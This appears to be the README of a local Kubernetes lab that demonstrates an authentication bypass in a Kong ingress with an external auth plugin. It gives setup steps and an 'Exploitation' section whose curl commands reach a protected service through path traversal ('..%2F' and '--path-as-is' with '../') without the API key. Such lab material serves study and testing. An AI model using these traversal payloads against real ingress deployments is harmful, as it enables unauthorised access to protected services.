# Installation

* install minikube
* create namespace: `kubectl create ns kong`
* create external auth plugin in configMap: `kubectl create configmap kong-external-auth-plugin --from-file=kong-external-auth-plugin -n kong`
* install kong ingress `helm install kong/kong -n kong --generate-name --set ingressController.installCRDs=false --values values.yaml --version 2.6.0`
* wait for it to run all pods and services
* add `127.0.0.1 app.test` to /etc/hosts
* apply kong plugins config: `kubectl apply -f plugins.yaml`
* apply kubernetes configuration: `kubectl apply -f app.yaml`
* run `minikube tunnel`

### Optional steps to build custom docker images:

* build docker images:
  * `cd auth-service; docker build -t auth-service:0.0.2-kong .`
  * `cd protected-service; docker build -t protected-service:0.0.1 .`
  * `cd public-service; docker build -t public-service:0.0.1 .`
* push docker images into minikube:
  * `minikube image load auth-service:0.0.2-kong`
  * `minikube image load protected-service:0.0.1`
  * `minikube image load public-service:0.0.1`

# Exploitation

To access public service: `curl -v http://app.test/public-service/public`

To access protected service: `curl -v http://app.test/protected-service/protected -H "X-Api-Key: secret-api-key"`

To access protected service bypassing authentication: `curl -v http://app.test/public-service/..%2Fprotected-service/protected`
To access protected service bypassing authentication: `curl --path-as-is -v http://app.test/public-service/../protected-service/protected`